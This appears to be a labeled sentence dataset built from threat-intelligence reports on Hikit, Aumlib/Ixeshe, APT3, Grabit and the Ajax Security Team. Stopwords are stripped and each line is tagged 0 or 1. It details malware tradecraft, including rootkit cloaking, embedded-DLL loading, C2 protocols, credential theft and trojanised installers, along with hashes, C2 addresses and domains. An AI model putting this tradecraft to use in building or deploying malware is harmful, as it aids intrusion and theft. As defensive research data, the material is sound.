Upon activation Driver expose interface calling IoCreateDevice name \Device\agony ( Gen 2.0 Beta samples ) \Device\HTTPS ( Gen 2.1 samples ) \Device\advcachemgr ( Gen 2.2 samples ) \Device\diskdump ( Gen 2.3 samples )	1
The Driver also creates symbolic link device using name \DosDevices\ tree	1
For reasons unknown authors Driver used code Chinese blog details hide network connections Windows Vista later decided keep example IP address within code	0
The Hikit family supported roughly set commands since first known samples Gen 1.0	1
Gen 2.0 introduced single command provide insight infected machine 's Hikit configuration ( something necessary Gen 1 variants since server-based )	0
The RAT supports following commands The shell command activates remote shell victim 's computer	1
The remote shell function uses standard pipe redirection method interfacing network application ( case DLL ) hidden command shell	0
The file command provides attacker variety disk access options listing directories changing current directory uploading downloading files	1
The connect function provides functionality allow one Hikit DLL interface another DLL similar version	0
The use functionality best illustrated considering fact Gen 1 Driver requires exposed network interface order external attacker access Gen 1 's RAT function	0
This would prohibit lateral movement within victim 's network bulk organization 's network infrastructure directly exposed Internet	0
By using connect command attacker instruct externally exposed Gen 1 DLL route traffic Gen 1 DLL behind firewall effectively making externally exposed Gen 1 DLL local router Hikit traffic	0
The proxy ( socks5 ) command allows attacker utilize Hikit-infected machine proxy	1
Gen 2 samples rely configuration order know C2 server exists along operational aspects name service operational times	1
This information important attacker access order determine aspect configuration date ( thus requiring new variant Gen 2 binary configured deployed )	0
The information command returns attacker complete configuration current state Gen 2 malware	0
As name implies exit command causes DLL discontinue current connection	0
With Gen 1 sub-family using server model Gen 2 sub-family using client model understanding DLL components sub-families works best done Driver context specific sub-family	0
As noted previously report Gen 1 sub-family several sub-generations overall functionality Gen 1 sub-family remained constant	0
With exception Gen 1.0 functionality Gen 1 comes DLL component ( Gen 1.0 uses stand-alone executable achieve results )	0
The DLL operates service requiring attacker install DLL service point prior activation	1
The DLL contains two exports DllEntryPoint DllRegisterServer	0
Ultimately exports generate new thread function ( '' mainThread '' )	1
The difference two exports DllRegisterServer take optional command line argument letter '' u '' instruct main thread uninstall Gen 1 system victim 's computer	1
If uninstall argument exists mainThread simply remove Driver victim 's machine terminate	1
The authors Gen 1 used freely available source code found online removal function	0
When DLL activates either call DllEntryPoint calling DllRegisterServer without u parameter mainThread begins verifying version Driver installed victim 's machine	1
This requires sending OID 0x12C850 Driver comparing resulting 32-bit value required driver version	0
If version incorrect ( i.e	0
n't match specified version ) DLL installs version Driver found within DLL 's resource section ( BIN resource tree )	1
With Driver version verified ( forcibly corrected installing appropriate Driver ) DLL instruct Driver use specified string ( Gen 1.0 Gen 1.1 samples ) DWORD ( Gen 1.2 samples ) acknowledgment value send connecting client requests appropriate URL	1
The DLL checks version Driver versions DLL print message indicating version Driver installed report '' Transate version '' ( word translate misspelled within binary )	0
It appears Driver communication protocol version necessarily match exactly allowing possibility Driver DLL could compiled separate times	0
If Driver version less '' Transate '' version ( indicating Driver version old support necessary communication protocols ) DLL version DLL print line screen indicating DRIVERMINVERSION required along current Driver version	0
Following DLL attempt install correct version Driver prior terminating	1
It unclear code exists given DLL check Driver version correct Driver necessary prior reaching portion code reports DRIVERMINVERSION	0
It possible second Driver version check last ditch effort ensure correct Driver installed	1
The DLL enters infinite loop DLL waits Driver report new channel exists	0
A channel represents established connection Driver external party provided proper initial request Gen 1.2 variants provided proper authentication value	0
When Driver establishes new channel DLL generates runtime data structure generating new thread ( '' HikitThreadFunc '' ) service request coming new channel	1
This allows DLL service multiple channels one time	0
The HikitThreadFunc function core simple wait respond loop	0
The function begins transmitting Hikit command prompt client ( Hikit ) settling infinite loop The communication scheme DLL client consists 20 24 byte header ( Gen 1.0 Gen 1.1 ) 28 byte header ( Gen 1.2 ) followed optional payload	0
The format Gen 1.0 Gen 1.1 header follows While Gen 1.2 header For Gen 1.0 Gen 1.1 samples magic field contains string '' ..	0
..	0
'' ( two dots followed space two dots )	0
Whereas key field Gen 1.2 samples contains 32-bit value represents XOR key remainder PacketHeader additional payload data	0
The XOR scheme works 32-bit chunks data 32-bit chunk data XOR 'd key value	0
Version checking important Gen 1 variants	0
The dwHikitVersion field allows client DLL ensure compatible communication scheme place prior executing commands	1
Gen 1 samples particular interest victim 's locale language preferences	0
While typical RATs provide remote shells simply pass data unfiltered client server server client without regard code pages Gen 1 samples take special care record code page locale information every packet header traverses divide client server server client	0
This could indicate authors Gen 1 understood early stage development Gen 1 would attacking computer systems different locales code pages	0
The Gen 2 sub-family like Gen 1.2 uses DLL core RAT functionality	1
In order DLL load Gen 2 ( starting Gen 2.1 ) uses loader application ( referred simply '' Loader '' )	1
The Loader comes form standard executable image DLL image	0
Despite different models variants Loader load embedded DLL exact way	1
The difference executable DLL versions Loader comes handle initialization embedded DLL	0
Figure 1 provides side side comparison startup routines executable DLL Loaders	0
Both versions Loader begin loading embedded DLL Loader 's resources ( item 102 Group Icons resource tree ) decrypting decompressing image memory manually loading DLL memory using custom loading routine	1
The function LoadEmbeddedImage seen part Figure 2 responsible operation	0
The Loader obfuscates many strings using simple XOR encoding scheme	0
Decryption encoded strings consists taking first value string XOR key XOR'ing subsequent bytes result XOR returns 0	0
The decoding encoded strings handled DecodeString function	0
The Loader stores embedded DLL within Group Icon resource within legitimate icon image	0
In order locate embedded DLL LoadEmbeddedImage use DecodeString function decrypt delimiter string ( typically zzzzzzzzzz yyyyyyyyyy ) search icon's resource memory delimiter string	0
Once located LoadEmbeddedImage use first 12 bytes immediately string information structure embedded DLL	0
The structure ( seen ) defines size embedded DLL within icon 's resource memory size DLL decompressed 4-byte XOR key LoadEmbeddedImage must use decode embedded DLL prior decompression	0
LoadEmbeddedImage copies compressed embedded DLL newly allocated heap buffer calls function decodeBuffer ( using EncodingKey value ) decrypt embedded DLL	1
Another heap buffer allocated size equal value dwImageSizeDecompressed	0
The decompression buffer along decoded compressed buffer given lzodecompress decompresses compressed image using LZO1X algorithm	0
With embedded DLL decompressed heap buffer LoadEmbeddedImage calls ImageLoaderData :LoadDll manually load DLL memory	1
ImageLoaderData :LoadDll interprets PE/COFF header DLL image loads image appropriate memory configuration performs necessary relocation operations calls DllMain ( DLL 's entry point ) function	1
After loading embedded DLL image memory Loader either call DLL's StartServer MatrixMain function depending type Loader	1
The standalone Loaders use MatrixMain function DLL Loaders call StartServer function	1
The Loaders upon unloading call StopServer function order shut embedded DLL	1
The Gen 2 DLL exposes five exported functions ( besides DllEntryPoint/DllMain )	0
MatrixMain StartServer ultimately generate new thread ( using POSIX API function beginthreadex instead common CreateThread ) contains main loop Gen 2 RAT functionality	1
MatrixMain however added functionality	0
The prototype MatrixMain follows Arguments parameter If parameter given DLL install service victim 's machine	1
The DLL create new service ( e.g	1
'' Network DDE Service '' ) assign executable service	0
The DLL 's RAT functionality provides basic features network port forwarding ( proxying ) file transfer remote command shell	1
The RAT functionality provides attacker ability establish phantom network within victim 's infrastructure individual instances Gen 2 DLL listen incoming connections local ports ( presumably NAT 'd ports ) accept commands inbound connection	1
This allows attacker establish several Gen2 infections within victim's infrastructure outbound connectivity prohibited infected machines attacker route commands pseudo-isolated infections accessible infected machines providing high level persistence malware	1
Each Gen 2 infection support 10 listening ports	1
The communication Gen 2 malware C2 ( Gen 2 malware case internal routing functionality ) encrypted using simple DWORD XOR scheme	1
Each communication burst ( either malware C2 malware neighboring malware ) begins 24-byte header identical header found Gen 1.2	0
Immediately following header type-specific ( indicated dwPayloadType field ) payload data	0
Note dwXORKey value NOT encoded XOR value rather value used encoding header payload	0
Each DLL includes hardcoded default configuration	0
At time RAT functionality activates DLL drop current configuration disk	0
If configuration file already exists RAT use file version configuration default configuration	0
The configuration data structure ( seen ) doubles current state record aspects communication subsystem DLL	0
When stored disk configuration preceded GUID value ( 16 bytes ) represents unique identifier specific infection	0
The configuration XOR encoded using first 4 bytes ( DWORD ) GUID	0
In order provide level stealth RAT install rootkit 32-bit versions Windows	1
The DLL contains device driver image embedded within encoded buffer RAT functionality code extract % TEMP % directory ( XOR'ing buffer 0x76 )	0
To activate rootkit RAT functionality code creates service driver % TEMP % directory executable service	1
The RAT functionality code activates service opens handle device driver 's interface ( e.g	1
\Globals\HTTPS )	0
With handle open rootkit driver RAT functionality code deletes service order reduce visible footprint new driver	1
To reduce footprint driver RAT functionality code also uses cloaking functionality rootkit hide DLL 's PID references GUID { 4AE26357-79A3-466D-A6D9- FC38BFB67DEA } DLL 's service names ( e.g '' NetDDESrv '' '' Network DDE Service '' ) service entry well	1
Additionally code also attempts hide service named '' Hitx ''	1
In addition main Hikit malware least two examples support programs belong Hikit family	0
Samples b04de6c417b6f8836e3f2d8822be2e68f4f9722b 7c4da9deff3e5c7611b9e1bd67d0e74aa7d2d0f6 examples Gen 1.0 Gen 1.2 operator consoles	0
The console text based application takes Gen 1.0 Gen 1.2 infection 's IP address proceeds connect authenticate infected server	1
Once connected operator basic Hikit functionalities available via commands file shell	1
Detecting Hikit variants disk memory possible using following YARA signature developed Symantec Detecting nominal Gen 1.2 later network activity problematic given nature communication structure	0
The encrypted nature nominal Gen 1.2 later network traffic makes signature difficult	0
Snort signature 30948 may detect Hikit based network traffic Gen 1.0 Gen 1.1	0
From system objects perspective Gen 2 samples produce three named events	1
The event names change per infection common format	0
The attackers behind breach New York Times ' computer network late last year appear mounting fresh assaults leverage new improved versions malware	0
The new campaigns mark first significant stirrings group since went silent January wake detailed expose group exploits - retooling security researchers believe massive spying operation based China	0
The newest campaign uses updated versions Aumlib Ixeshe	0
Aumlib years used targeted attacks encodes certain HTTP communications	1
FireEye researchers spotted malware analyzing recent attempted attack organization involved shaping economic policy	0
And new version Ixeshe service since 2009 attack targets East Asia uses new network traffic patterns possibly evade traditional network security systems	1
The updates significant longstanding malware families ; year Aumlib changed since least May 2011 Ixeshe evolved since least December 2011	0
Cybercriminals constantly evolving adapting attempts bypass computer network defenses	0
But larger successful threat actors tend evolve slower rate	0
As long actors regularly achieve objective ( stealing sensitive data ) motivated update rethink techniques tactics procedures ( TTPs )	0
These threat actors ' tactics follow principles evolution – successful techniques propagate unsuccessful ones abandoned	0
Attackers change approach unless external force environmental shift compels	0
As old saying goes If ai n't broke n't fix	0
So larger successful threat actor changes tactics move always piques attention	0
Naturally first priority ensuring detect new altered TTPs	0
But also attempt figure adversary changed - broke ? - predict change future	0
We observed example phenomenon around May	0
About four months The New York Times publicized attack network attackers behind intrusion deployed updated versions Backdoor.APT.Aumlib Backdoor.APT.Ixeshe malware families	1
The previous versions Aumlib changed since least May 2011 Ixeshe evolved since least December 2011	0
We say sure whether attackers responding scrutiny received wake episode	0
But know change sudden	0
Akin turning battleship retooling TTPs large threat actors formidable	0
Such move requires recoding malware updating infrastructure possibly retraining workers new processes	0
The following sections detail changes Backdoor.APT.Aumlib Backdoor.APT.Ixeshe	0
Aumlib used targeted attacks years	0
Older variants malware family generated following POST request Data sent via POST request transmitted clear text following structure A recently observed malware sample ( hash value 832f5e01be536da71d5b3f7e41938cfb ) appears modified variant Aumlib	1
The sample deployed organization involved shaping economic policy downloaded following URL The sample generated following traffic This output reveals following changes compared earlier variants The POST URI changed /bbs/search.asp ( mentioned earlier Aumlib variants used POST URI /bbs/info.asp	0
) The POST body encoded	1
Additional requests sample generated following traffic These subtle changes may enough circumvent existing IDS signatures designed detect older variants Aumlib family	0
The sample 832f5e01be536da71d5b3f7e41938cfb shares code older Aumlib variant hash cb3dcde34fd9ff0e19381d99b02f9692	0
The sample cb3dcde34fd9ff0e19381d99b02f9692 connected documents [ ] myPicture [ ] info www [ ] documents [ ] myPicture [ ] info expected generated POST request /bbs/info.asp	1
Ixeshe used targeted attacks since 2009 often entities East Asia	0
Although network traffic encoded custom Base64 alphabet URI pattern largely consistent We analyzed recent sample appears targeted entities Taiwan target consistent previous Ixeshe activity	1
This sample ( aa873ed803ca800ce92a39d9a683c644 ) exhibited network traffic match earlier pattern therefore may evade existing network traffic signatures designed detect Ixeshe related infections	1
The Base64-encoded data still contains information including victim 's hostname IP address also '' mark '' '' campaign tag/code '' threat actors use keep track various attacks	1
The mark particular attack [ ll65 ]	0
Based observations successful threat actors evolve slowly deliberately	0
So change pay close attention	0
Knowing attackers ' strategy shifting crucial detecting defending today 's advanced threats	0
But knowing '' '' equally important	0
That additional degree understanding help organizations forecast threat actor might change behavior - successfully foil attacks probably	0
This entry posted Threat Intelligence Threat Research Ned Moran Nart Villeneuve	0
Bookmark permalink	0
APT3 ( also known UPS ) actors responsible Operation Clandestine Fox quietly continued send waves spearphishing messages past months	1
This actor initiated recent campaign November 19 2014 targeting multiple organizations	0
The attacker leveraged multiple exploits targeting CVE-2014-6332 CVE-2014-4113	0
CVE-2014-6332 disclosed publicly 2014-11-11 Windows OLE Automation Array Remote Code Execution vulnerability	1
CVE-2014- 4113 privilege escalation vulnerability disclosed publicly 2014-10-14	1
The use CVE-2014-6332 notable demonstrates multiple classes actors criminal APT alike incorporated exploit toolkits	0
Further use two known vulnerabilities tandem notable APT3	0
This actor historically known leveraging zero- day vulnerabilities widespread infrequent phishing campaigns	0
The use known exploits frequent attacks may indicate shift strategy operational tempo group	0
The body message One Month 's Free Membership The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS 4,000 MODELS Nude Celebrities Playmates Cybergirls & More Click hxxp //join.playboysplus.com/signup/ To Get Free Plus Member Now & Never Miss Another Update	0
Your Member referrals must remain active	0
If anyone getting '' Promotion available '' 1 month free membership might get issue 48 hrs membership expired make sure Clear cookies use another browser use another PC	0
The webpage contained CVE-2014-6332 exploit code VBScript invoked PowerShell affected users ' system download payload The CVE-2014-6332 exploit code seen incident derived code published http //www.exploit-db.com/exploits/35230/ also incorporated Metasploit project	1
After exploit script executes system downloads install.exe following metadata The file install.exe attempts write two files ( doc.exe test.exe ) hard-coded path '' C \Users\Public '' fails Windows XP path present default	1
The first dropped file doc.exe contains CVE-2014-4113 exploit attempts execute test.exe elevated privileges	1
These files following metadata These payload files also interesting PDB debug strings	0
The interesting PDB string '' 4113.pdb '' appears reference CVE-2014-4113	0
This CVE local kernel vulnerability successful exploitation would give user SYSTEM access machine	1
The malware component test.exe uses Windows command '' cmd.exe '' /C whoami '' verify running elevated privileges '' System '' creates persistence creating following scheduled task When executed malware first establishes SOCKS5 connection 192.157.198.103 using TCP port 1913	1
The malware sends SOCKS5 connection request '' 05 01 00 '' verifies server response starts '' 05 00 ''	1
The malware requests connection 192.184.60.229 TCP port 81 using command '' 05 01 00 01 c0 b8 3c e5 00 51 '' verifies first two bytes server '' 05 00 '' ( c0 b8 3c e5 IP address 00 51 port network byte order )	1
Once connection server established malware expects message containing least three bytes server	1
These first three bytes command identifier	0
The following commands supported malware On October 28 observed APT3 sending spearphishing messages containing compressed executable attachment	1
The deflated exe variant downloader described connected 198.55.115.71 port 1913 via SOCKS5 proxy	1
The secondary payload case detected Backdoor.APT.CookieCutter ( aka Pirpi ) also named newnotepad.exe ( MD5 8849538ef1c3471640230605c2623c67 ) connected known APT3 domains The 192.184.60.229 IP address seen current campaign also hosts securitywap [	1
] com – another known domain referenced Operation Clandestine Fox blog	0
In addition join.playboysplus [	0
] com exploit payload delivery site resolves 104.151.248.173	0
This IP hosted domains used APT3 past campaigns As discussed previous blog detailing previous APT3 activity walterclean [ ] com served Plugx/Kaba command control server	1
Although APT3 well known employing zero-day exploits attacks recent activity demonstrated also attack targets known exploits social engineering	1
Since Operation Clandestine Fox observed actor execute multiple attacks rely zero-day exploits	0
The combination sustained operational tempo lack zero-day exploits may indicate group changed strategy decided attack frequently steady access zero-day exploit code	0
No matter strategy actor shown ability operate successfully	0
IOCs threat found	0
Not long ago Kaspersky clients United States approached Kaspersky researchers request investigate new type malicious software able recover organizations ' servers	0
The malware calls Grabit distinctive versatile behavior	0
Every sample found different size activity others internal name identifiers disturbingly similar	0
The timestamp seems valid close documented infection timeline	0
Our documentation points campaign started somewhere late February 2015 ended mid- March	0
As development phase supposedly ended malware started spreading India United States Israel countries around globe	0
All dozens samples managed collect programmed Windows machine 32bit processor Microsoft .NET Framework ( Visual Basic / C # )	0
Files compiled course three days March 7th 9th 2015	0
The following chart illustrates group individual created samples size sample time day compiled time lapses compilation	0
The smallest sample ( 0.52Mb ) largest ( 1.57Mb ) created day could indicate experiments made group test features packers " dead code " implementations	0
Looking chart interesting see modus operandi threat actor consistently strives achieve variety samples different code sizes supposedly complicated obfuscation	0
Along different sizes activities obfuscation serious encryption algorithm also implemented one	0
The proprietary obfuscated string methods classes made rather challenging analyze	0
ASLR also enabled might point open source RAT even commercial framework packed malicious software well written structure	0
This type work known mitigation factor threat actors keep code hidden analysts ' eyes	0
During research dynamic analysis showed malicious software 's " call home " functionality communicates obvious channels go extra mile hide activity	0
In addition files programmed make kind registry maneuvers would hide Windows Explorer	0
Taking equation seems threat actors sending " weak knight heavy armor " war	0
It means whoever programmed malware write code scratch	0
A well trained knight would never go war blazing shield yet stick sword	0
Looking " call home " traffic Keylogger functionality prepares files act container keyboard interrupts collecting hostnames application names usernames passwords	0
However interesting part lies	0
The file names contain informative string	0
HawkEye_Keylogger_Execution_Confirmed_<VICTIM 3.10.2015 6:08:31 PM HawkEye commercial tool development years ; appeared 2014 website called HawkEyeProducts made famous contribution hacker community	0
In website product shows great versatility contains many types RATs features functionality traditional HawkEye Logger types remote administration tools like Cyborg Logger CyberGate DarkComet NanoCore	0
It seems support three types delivery FTP SMTP Web - Panel	0
As seen malware uses number RATs control victims track activity	1
One threat actor 's successful implementations contained well - known DarkComet	0
This convenient " choose RAT " functionality plays important role malware infection routine survival victim 's machine	0
The DarkComet samples complicated traditional HawkEye logger	0
One instance random key generator sets initialization vector first 4 bytes executable file appends random 5 byte key unpacks another PE file less 20Kb size	0
The PE file contains another packer even challenging obfuscation technique	0
The last sample tested still complicated behavior	0
The code obfuscation technique though traffic transferring clear text	0
Stolen data packed sent encrypted HTTP random ports	1
This means group trying produce types malicious samples different RATs	0
Approximately 10,000 stolen files collected	0
Companies based Thailand India largest percentage infected machines	0
By looking stolen credentials clear employees sent malware one another stolen host names internal applications	0
The following full chart updated May 2015	0
Malware distribution country Demonstrating effectiveness simple Keyloggers one C2 ( May 15th ) maintained thousands victim account credentials hundreds infected systems	0
To sum Grabit threat actors use sophisticated evasions maneuvers dynamic activity	0
It interesting see major differences core development malware actual functionality uses	0
Some malware samples used hosting server even credentials	0
Could threat actor hurry ? Our guess looking group individual	0
Some members group technical others security oriented aware risks might expose	0
Back square one	0
From seen far malware delivered Microsoft Office Word ( .doc ) email attachment containing malicious macro called AutoOpen	1
This macro simply opens socket TCP sends HTTP request remote server hacked group serve malware hub downloading malware	0
In cases malicious macro password protected threat actor might forgotten .doc file actually archive archive opened convenient editor choice macro strings shown clear - text	0
The malware plain view modifying commonplace registry entries startup configurations covering tracks	1
Its binaries deleted cases communication clear- text victim sniff communication grab FTP / SMTP server 's credentials	0
Malware derivatives mainly located	0
C:\Users\ user \AppData\Roaming\Microsoft Phishing extensions .doc 3f77403a64a2dde60c4962a6752de601d56a621a 4E7765F3BF73AEC6E350F412B623C23D37964DFC Icons .pdf .doc .ttf .xls .ppt .msg .exe Stealer .txt .jpeg .eml Additional Executable names	0
Malware extensions .zip .exe IP Addresses	0
We believe 're seeing evolution development Iranian-based cyber activity	0
In years past Iranian actors primarily committed politically-motivated website defacement DDoS attacks	1
More recently however suspected Iranian actors destroyed data thousands computers Shamoon virus penetrated Navy Marine Corps Intranet ( NMCI ) used U.S. Navy worldwide	1
In report document activities Ajax Security Team hacking group believed operating Iran	0
Members group accounts popular Iranian hacker forums ashiyane [	0
] org shabgard [	0
] org engaged website defacements group name '' AjaxTM '' since 2010	0
By 2014 Ajax Security Team transitioned performing defacements ( last defacement December 2013 ) malware-based espionage using methodology consistent advanced persistent threat actors region	0
It unclear Ajax Security Team operates isolation part larger coordinated effort	0
The Ajax Security Team uses malware tools appear publicly available	0
We seen group leverage varied social engineering tactics means lure targets infecting malware	1
Although observed use exploits means infect victims members Ajax Security Team previously used publicly available exploit code web site defacement operations	0
In sum FireEye recently observed Ajax Security Team conducting multiple cyber espionage operations companies defense industrial base ( DIB ) within Unites States well targeting local Iranian users anti-censorship technologies bypass Iran 's Internet filtering system	0
The transition patriotic hacking cyber espionage uncommon phenomenon	0
It typically follows increasing politicization within hacking community particularly around geopolitical events	0
This followed increasing links hacking community state particularly military and/or intelligence organizations	0
In late 1990 's early 2000 's similar transition occurred within Chinese hacking community	0
During time period Chinese hacking community engaged website defacements denial service attacks conjunction incidents accidental bombing Chinese embassy Belgrade 1999 collision U.S. spy plane Chinese military plane 2001 Japanese Prime Minister 's controversial visit Yasukuni shrine 2005	1
Around time significant shift philosophy began take place	0
Members Chinese hacking community participated attacks soon found transitioning cyber espionage rewarding-both terms developing advanced skill set well monetary remuneration	0
One group known NCPH ( Network Crack Program Hacker ) whose founding member '' Wicked/Withered Rose '' patriotic hacker made transition cyber espionage founding '' hacker-for-hire '' group simultaneously developed association Chinese military	0
The group began developing zero-day exploits rootkits remote access tools ( RATs ) -using attacks variety targets including U.S. Department Defense	0
( One group 's associates '' whg '' still active believed developed one variant PlugX/SOGU malware	0
) The rationale behind transition within Chinese hacking community nicely summed message '' Honker Union China '' members 2010 What benefit hacking Web page bring country people ? It form emotional catharsis please launch pointless attacks real attack fatally damage network gain access sensitive information	0
In Iran hacking community appears undergoing similar transformation	0
While variety Iranian hacker groups engaged politically motivated website defacements emergence '' Iranian Cyber Army '' 2009 demonstrated '' concentrated effort promote Iranian government 's political narrative online ''	0
They targeted among others news organizations opposition websites social media	0
This marked beginning large- scale cyber offensive perceived enemies Iranian government	0
Foreign news opposition websites routinely blocked Iran tools allow users Iran bypass restrictions	0
One key stakeholders Iran 's Internet censorship program Iranian Revolutionary Guard Corps ( IRGC ) Basij paramilitary organization operates	0
The Basij formed Basij Cyber Council actively recruits hackers order develop defensive offensive cyber capabilities	0
There increasing evidence suggest hacker community Iran engaged transition politically motivated defacements denial service attacks cyber espionage activities	0
This model consistent Basij 's recruitment paramilitary volunteer hackers '' engage less complex hacking infiltration operations '' leaving technical operations entities increasingly direct control	0
As capabilities threat actors operating Iran traditionally considered limited	0
However '' Shamoon '' attacks wiped computers Saudi Arabia Qatar indicate improvement capabilities	1
And unsurprisingly Iran reportedly increased efforts improve offensive capabilities targeted Stuxnet Flame	0
We observed Ajax Security Team use variety vectors lure targets installing malicious software and/or revealing login credentials	1
These attack vectors include sending email private messages via social media fake login pages propagation anti-censorship software infected malware	1
During investigation discovered attackers sent targeted emails well private messages social media	1
For example attackers targeted companies DIB using fake conference page lure trick targets installing malicious software	1
The attackers registered domain '' aeroconf2014 [ ] org '' order impersonate IEEE Aerospace conference - conference 's actual domain aeroconf.org-and sent email following information The email encouraged users visit fake conference website owned attackers Upon visiting website visitors notified must install '' proxy '' software order access actually malware	1
The attackers also used phishing attacks set Web pages emulate various services require security credentials	1
The attackers tailored login pages specific targets DIB spoofed variety services Outlook Web Access VPN login pages	1
If users attempt login fake Web pages attackers collect login credentials	1
All Internet Service Providers ( ISPs ) Iran required implement filtering technology censors access content Iranian government deems unacceptable	0
This content includes categories pornography political opposition	0
In response restrictions Iranians increasingly using software bypasses filtering technology	0
To counter anti-censorship efforts Iran attempted block use certain software tools	0
In 2012 researchers found anti-censorship tool primarily used Internet users Iran bundled malware redistributed	1
Our investigation found malware-laden versions legitimate anti-censorship software Psiphon Ultrasurf distributed users Iran Persian speaking people around world	1
We observed Ajax Security Team use malware family identify simply 'Stealer '	0
They deliver malware malicious executable ( dropper )	1
The executable CAB extractor drops implant IntelRS.exe	1
This implant turn drops various components C \ Documents Settings\ { USER } \Application Data\IntelRapidStart\	1
The following files written disk location The IntelRS.exe written .NET	1
aptly named '' Stealer '' various data collection modules	1
It drops launches AppTransferWiz.dll via following command 110 ordinal corresponds '' StartBypass '' export AppTransferWiz.dll	1
Data exfiltration conducted FTP AppTransferWiz.dll acts FTP client	1
This DLL written Delphi	0
There code exfiltrate data HTTP POST well unused	1
We also found incomplete code would perform SFTP SMTP exfiltration could completed future version	1
State maintained stealer component IntelRS.exe FTP component AppTransferWiz.DLL using file FTP server '' sqlite3.dll '' well global atom '' SQLiteFinish ''	0
IntelRS.exe waits indefinite loop AppTransferWiz.DLL defines state	0
Once state set IntelRS.exe proceeds collect data various areas system described IntelRS.exe loads Delphi component called DelphiNative.DLL implements additional data theft functionality following The Stealer component uses common techniques acquire credential data	1
For instance loads vaultcli.DLL uses various APIs shown acquire RDP accounts Windows vault	1
Harvested data encrypted written disk local host	1
The filenames encrypted files follow naming scheme The { stolen data type } parameter indicates data harvested ( e.g. Web browser instant messenger application installed proxy software )	0
Analysis malware indicates data encrypted via Rijndael cipher implementation ; specifically uses AES specific set configurations Rijndael	1
It uses key size 256 bytes block size 128 bytes conforms FIPS-197 specification AES-256	0
It utilizes passphrase 'HavijeBaba' salt 'salam * % # ' input PBKDF2 ( Password-Based Key Derivation Function 2 ) derive key initialization vector encryption	0
This key derivation implementation .NET	0
done using Rfc2898DeriveBytes class	0
The passphrase salt Persian language words	0
'' Havij '' means '' carrot '' '' Baba '' means '' father '' '' Salam '' common greeting means '' Peace ''	0
We identified 17 droppers research including The 2009 compile time appears forged 2013 compile times may legitimate	0
In cases found implant parent dropper	0
In total 22 23 implants identified research unique compile times ranging 2013-10-29 2014-03-15	0
We identified two implants compiled 2014-3-15 23:16	0
These compile times appear legitimate coincide attempted intrusion activity attributed attackers	0
Many malicious executables ( droppers ) collected bundled legitimate installers VPN proxy software	1
Examples include • 6dc7cc33a3cdcfee6c4edb6c085b869d bundled installer Ultrasurf Proxy software	1
• 3d26442f06b34df3d5921f89bf680ee9 bundled installer Gerdoovpn virtual private network software	1
• 3efd971db6fbae08e96535478888cff9 bundled installer Psiphon proxy	1
• 288c91d6c0197e99b92c06496921bf2f bundled installer Proxifier software	1
These droppers also designed visually spoof appearance applications	1
These droppers contained icons used legitimate installers programs	1
Analysis PDB strings seen implants indicates may one developer working source code Stealer builder	0
The following two PDB paths seen collection implants collected These strings indicate Stealer source code stored two different paths necessarily two different computers	0
The f \ Projects\ path may external storage device thumb drive	0
It therefore possible one person access source code keeps separate repository external storage device	0
Alternatively different file paths could result two different actors storing source code two different locations	0
In nine implants collected found consistent portable executable ( PE ) resource SHA256 5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3	0
This PE resource contains VSVERSIONINFO	0
In layman 's terms best described metadata describing executable file	0
This specific PE resource contained following information Note InternalName 'Stealer.exe '	0
This attackers ' name malware family	0
During research recovered two different tools used members Ajax Security Team conjunction targeted intrusion activities	0
The first tool labeled 'Stealer Builder ' compiled 2014-04-08	0
This compile date may indicate group still active	0
Upon executing 'Stealer Builder ' user presented option load 'Builder ' 'Decrypt ' logs generated victim exfiltrated command-and-control ( CnC ) server groups ' control	1
The Builder option enables attacker configure new Stealer backdoor	1
The user configure new backdoor connect specific CnC server personalized username password	1
The attacker bind backdoor legitimate application choosing cloak icon designed make backdoor appear though legitimate file	1
We also noted Builder allow attacker select new passphrase salt used encrypt stolen data	0
The passphrase 'HavijeBaba ' salt 'salam * % # ' hardcoded builder	0
During testing observed backdoors generated Stealer Builder timestamp 2013-12-19	0
We one backdoor repository timestamp	0
This sample ( MD5 1823b77b9ee6296a8b997ffb64d32d21 ) configured exfiltrate data ultrasms [ ] ir	1
The VSVERSIONINFO PE resource mentioned ( SHA256 5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3 ) artifact Stealer builder recovered	0
The builder generates executable named IntelRapidStart	0
exe	0
This executable contains aforementioned VSVERSIONINFO PE resource	0
We also recovered tool designed encode plaintext Base64 encoded text decode Base64 encoded text plaintext	0
Members Ajax Security Team likely use tool encode configuration data seen RapidStartTech.stl files	0
As noted RapidStartTech.stl contains backdoor 's FTP credentials implant name decoy name screenshot interval along boolean settings startup keylogger screenshot plugins	0
Encoding decoding Base64 data straightforward task standard Linux operating system offers number command line tools achieve task	0
The presence Windows-based GUI tool simplifies encoding decoding Base64 data indicates tools may developed less adept users	0
The CnC infrastructure consists distinct linked clusters targeted users anti-censorship tools Iran well defense contractor companies U.S	0
The first cluster contains domain used Aerospace Conference attack well domains used phishing attacks designed capture user credentials The website used Aerospace Conference attack aeroconf2014 [	1
] org registered info @ usa.gov [	0
] us	0
However historical WHOIS information shows domain registered keyvan.ajaxtm @ gmail [	0
] com-the domain used register ajaxtm [	0
] org website Ajax Security Team	0
The email addresses used register variations domain names associated popular services provided companies Google Facebook Yahoo LinkedIn	0
The second cluster comprises CnC infrastructure used anti-censorship attacks	0
The majority samples analyzed connect intel-update [ ] com update-mirror [ ] com registered james.mateo @ aim [	1
] com	0
The domain intel-update [	0
] com resolved IP address 88.150.227.197 also hosted domains registered osshom @ yahoo [	0
] com many consistent pattern registering domains associations Google Yahoo services	0
We also observed crossover sample connected intel- update [ ] com ultrasms [ ] ir registered lvlr98 @ gmail [	1
] com	0
These two clusters linked common IP address ( 5.9.244.151 ) used ns2	0
aeroconf2014 [	0
] org office.windows- essentials [	0
] tk	0
A third cluster activity found via analysis 1d4d9f6e6fa1a07cb0a66a9ee06d624a	0
This sample Stealer variant connects aforementioned intel-update [ ] com well plugin-adobe [ ] com	1
The domain plugin-adobe [	0
] com resolved 81.17.28.235	0
Other domains seen resolving IP address nearby include following Aside sample connecting plugin- adobe [ ] com discovered malware connecting domains	1
During investigation able recover information 77 victims one CnC server discovered analyzing malware samples disguised anti-censorship tools	1
While analyzing data victims found majority either timezone set '' Iran Standard Time '' language setting set Persian The largest concentration victims Iran based premise Persian language settings '' Iran Standard Time '' correlate victim geographically located Iran	0
As believe attackers disguised malware anti-censorship tools order target users tools inside Iran well Iranian dissidents outside country	1
The Ajax Security Team appears formed personas named '' HUrr c4nE '' '' Cair3x '' 2010	0
